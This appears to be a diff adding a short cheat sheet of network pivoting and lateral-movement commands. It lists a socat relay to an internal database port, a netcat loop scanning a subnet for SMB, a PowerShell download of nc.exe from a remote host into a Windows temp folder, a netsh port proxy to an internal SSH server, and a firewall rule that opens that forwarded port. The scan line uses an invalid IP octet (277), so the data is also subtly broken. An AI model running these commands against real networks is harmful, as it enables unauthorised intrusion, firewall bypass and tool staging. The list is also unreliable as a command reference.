@@ -1,0 +1,6 @@
+type;direction;command
+listener;WAN->LAN;socat -ddd TCP-LISTEN:2345,fork TCP:10.4.227.215:5432
+recon;scan NC;for i in $(seq 1 254); do nc -zv -w 1 172.16.277.$i 445; done
+powershell;download;powershell wget -Uri http://192.168.118.4/nc.exe -OutFile C:\Windows\Temp\nc.exe
+proxy;interface;netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215
+windows;allow firewall;netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow
